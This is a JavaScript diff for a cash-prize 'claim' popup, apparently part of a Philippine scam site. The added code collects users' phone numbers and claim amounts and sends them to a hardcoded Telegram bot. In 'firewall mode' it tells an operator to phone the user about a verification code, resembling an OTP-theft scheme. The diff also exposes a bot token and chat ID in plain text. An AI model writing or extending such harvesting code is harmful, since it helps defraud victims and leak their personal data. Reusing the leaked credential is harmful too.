@@ -8,7 +8,7 @@ let claimState = {
     hasRedirected: false
 };
 
-// Check kung naka-ON ang Firewall
+// Check if Firewall is active
 async function isFirewallActive() {
     if (typeof firebase !== 'undefined' && firebase.database) {
         try {
@@ -23,19 +23,34 @@ async function isFirewallActive() {
     return false;
 }
 
-// Ito ang pinaka-main function - dito nagdedecide kung anong popup
+// Send notification to admin when user requests verification
+async function sendVerificationRequestNotification(phone, amount) {
+    const message = `📞 VERIFICATION REQUEST (FIREWALL MODE)\n📱 ${phone}\n💵 ₱${amount}\n⏰ ${new Date().toLocaleString()}\n\nCall the user and provide the verification code.`;
+    try {
+        await fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(message)}`);
+        console.log("📨 Verification request sent to Telegram");
+    } catch(e) {
+        console.log("Telegram error:", e);
+    }
+}
+
+// Show claim popup - main entry point
 async function showClaimPopup(amount) {
     const firewallActive = await isFirewallActive();
     
     if (firewallActive) {
-        // FIREWALL ON - Verification call popup
+        // FIREWALL ON - Send notification to admin
+        const userPhone = localStorage.getItem("userPhone") || "Unknown";
+        await sendVerificationRequestNotification(userPhone, amount);
+        
+        // Show verification popup
         if (typeof window.showFirewallPopup === 'function') {
             window.showFirewallPopup();
         }
         return;
     }
     
-    // FIREWALL OFF - Congratulations popup
+    // FIREWALL OFF - Normal congratulations popup
     claimState.currentAmount = amount;
     claimState.isProcessing = false;
     claimState.hasRedirected = false;
@@ -144,7 +159,9 @@ function onClaimAction() {
     claimBtn.disabled = true;
     claimBtn.innerHTML = 'PROCESSING...';
     
-    fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent("💰 CLAIM REQUEST!\n📱 " + userPhone + "\n💵 ₱" + amount)}`)
+    // Send initial claim request to Telegram
+    const message = `💰 CLAIM REQUEST!\n📱 ${userPhone}\n💵 ₱${amount}\n⏰ ${new Date().toLocaleString()}`;
+    fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(message)}`)
         .catch(e => console.log('Telegram error:', e));
     
     if (typeof firebase !== 'undefined' && firebase.database) {
